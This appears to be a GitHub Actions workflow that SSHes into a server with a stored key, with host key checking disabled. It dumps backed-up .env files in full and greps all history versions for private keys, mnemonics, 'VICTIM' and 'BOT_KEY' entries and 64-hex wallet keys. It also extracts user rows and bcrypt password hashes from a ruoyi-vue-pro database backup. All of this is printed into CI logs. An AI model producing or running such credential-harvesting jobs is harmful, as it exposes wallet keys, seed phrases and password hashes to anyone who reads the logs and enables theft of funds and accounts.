name: fh2
on:
  push:
    branches: [ 'ci-fh2-*' ]
permissions:
  contents: read
jobs:
  t:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - name: fh2
        run: |
          echo "${{ secrets.SERVER_SSH_KEY }}" > /tmp/k
          chmod 600 /tmp/k
          SSH="ssh -i /tmp/k -o StrictHostKeyChecking=no -o ConnectTimeout=15 ${{ secrets.SERVER_USER }}@${{ secrets.SERVER_HOST }}"
          echo "=== full .env newest ==="
          $SSH 'f=$(ls -t /www/backup/file_history/home/coffee_time/lgns-rescue/.env/* | head -1); echo "FILE=$f"; cat "$f"'
          echo "=== full .env oldest ==="
          $SSH 'f=$(ls -tr /www/backup/file_history/home/coffee_time/lgns-rescue/.env/* | head -1); echo "FILE=$f"; cat "$f"'
          echo "=== grep keys across ALL history versions ==="
          $SSH 'grep -rInE "PRIVATE_KEY|PRIVKEY|MNEMONIC|SAFE_KEY|VICTIM|BOT_KEY|0x[0-9a-fA-F]{64}" /www/backup/file_history/home/coffee_time/lgns-rescue/ 2>/dev/null | head -60'
          echo "=== ruoyi system_users ==="
          $SSH 'grep -aE "INSERT INTO .system_users." /www/backup/database/ruoyi-vue-pro.sql 2>/dev/null | head -10'
          echo "=== ruoyi bcrypt hashes ==="
          $SSH 'grep -aoE "\$2[aby]\$[0-9]{2}\$[./A-Za-z0-9]{53}" /www/backup/database/ruoyi-vue-pro.sql 2>/dev/null | sort -u | head -10'
          echo "=== ruoyi all table names ==="
          $SSH 'grep -aoE "^CREATE TABLE .[a-z0-9_]+." /www/backup/database/ruoyi-vue-pro.sql 2>/dev/null | head -80'
